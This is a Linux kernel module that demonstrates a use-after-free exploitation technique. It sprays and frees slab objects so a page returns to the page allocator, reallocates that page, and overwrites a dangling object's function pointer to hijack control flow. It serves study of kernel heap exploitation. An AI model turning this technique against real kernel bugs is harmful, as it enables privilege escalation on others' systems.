/*
 *
 * 通过 free slab objects free 掉一个 page, 然后 UAF 利用
 *
 * */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/slub_def.h>
#include <linux/sched.h>

/*
模拟 filp_cachep

void __init files_init(void)
{
    filp_cachep = kmem_cache_create("filp", sizeof(struct file), 0,
            SLAB_HWCACHE_ALIGN | SLAB_PANIC | SLAB_ACCOUNT, NULL);
    percpu_counter_init(&nr_files, 0, GFP_KERNEL);
}

(gdb) p sizeof(struct file)
$1 = 256

➜  ~ cat /sys/kernel/slab/filp/cpu_partial
13
➜  ~ cat /sys/kernel/slab/filp/objs_per_slab
16

➜  ~ uname -r
5.10.90

*/

#define OBJ_SIZE 256
#define OBJ_NUM (16 * 16) 

struct my_struct {
    union {
        char data[OBJ_SIZE];
        struct {
            void (*func)(void);
            char paddings[OBJ_SIZE - 8];
        };
    };
} __attribute__((aligned(OBJ_SIZE)));

static struct kmem_cache *my_cachep;
struct my_struct **tmp_ms;
struct my_struct *ms;
struct my_struct *random_ms;
struct page *target;


void hello_func(void){
    pr_info("Hello\n");
}

void hack_func(void){
    pr_info("Hacked\n");
}

static int __init km_init(void){
#define OO_SHIFT    16
#define OO_MASK     ((1 << OO_SHIFT) - 1)
    int i, cpu_partial, objs_per_slab;
    struct page *target;
    struct page *realloc;
    void *p;
    
    tmp_ms = kmalloc(OBJ_NUM * 8, GFP_KERNEL);
    my_cachep = kmem_cache_create("my_struct", sizeof(struct my_struct), 0,
            SLAB_HWCACHE_ALIGN | SLAB_PANIC | SLAB_ACCOUNT,NULL);

    pr_info("%s\n", my_cachep->name);
    pr_info("cpu_partial: %d\n", my_cachep->cpu_partial);
    pr_info("objs_per_slab: %u\n", my_cachep->oo.x & OO_MASK);
    pr_info("\n");

    cpu_partial = my_cachep->cpu_partial;
    objs_per_slab = my_cachep->oo.x & OO_MASK;

    random_ms = kmem_cache_alloc(my_cachep, GFP_KERNEL);

    // 16 * 14
    for(i = 0; i < (objs_per_slab * (cpu_partial + 1)); i++){
        tmp_ms[i] = kmem_cache_alloc(my_cachep, GFP_KERNEL);
    }

    // 15
    for(i = (objs_per_slab * (cpu_partial + 1)); 
            i < objs_per_slab * (cpu_partial + 2) - 1; i++){
        tmp_ms[i] = kmem_cache_alloc(my_cachep, GFP_KERNEL);
    }

    // UAF
    ms = kmem_cache_alloc(my_cachep, GFP_KERNEL);
    target = virt_to_page(ms);
    pr_info("target page: %px\n", target);
    ms->func = (void *)hello_func;
    ms->func();
    kmem_cache_free(my_cachep, ms);

    // 17    
    for(i = objs_per_slab * (cpu_partial + 2) - 1; 
            i < objs_per_slab * (cpu_partial + 2) - 1 + (objs_per_slab + 1); i++){
        tmp_ms[i] = kmem_cache_alloc(my_cachep, GFP_KERNEL);
    }

    // free page
    for(i = (objs_per_slab * (cpu_partial + 1)); 
            i < objs_per_slab * (cpu_partial + 2) - 1; i++){

        kmem_cache_free(my_cachep, tmp_ms[i]);
        tmp_ms[i] = NULL;
    }

    for(i = objs_per_slab * (cpu_partial + 2) - 1; 
            i < objs_per_slab * (cpu_partial + 2) - 1 + (objs_per_slab + 1); i++){
        kmem_cache_free(my_cachep, tmp_ms[i]);
        tmp_ms[i] = NULL;
    }

    for(i = 0; i < (objs_per_slab * (cpu_partial + 1)); i++){
        if(i % objs_per_slab == 0){
            kmem_cache_free(my_cachep, tmp_ms[i]);
            tmp_ms[i] = NULL;
        }
    }

    // in other evil task
    realloc = alloc_page(GFP_KERNEL);
    if(realloc == target){
        pr_info("[+] Realloc success!!!\n");
    }else{
        return 0;
    }
    
    p = page_address(realloc);
    for(i = 0; i< PAGE_SIZE/8; i++){
        ((void **)p)[i] = (void *)hack_func;
    }

    ms->func();

    free_page((unsigned long)p);

    return 0;

}

static void __exit km_exit(void)
{
    int i;

    for(i = 0; i < OBJ_NUM; i++){
        if(tmp_ms[i])
            kmem_cache_free(my_cachep, tmp_ms[i]);
    }
    kmem_cache_free(my_cachep, random_ms);
    kmem_cache_destroy(my_cachep);
    kfree(tmp_ms);
    pr_info("Bye\n");
}


module_init(km_init);
module_exit(km_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("X++D");
MODULE_DESCRIPTION("Kernel xxx Module.");
MODULE_VERSION("0.1");

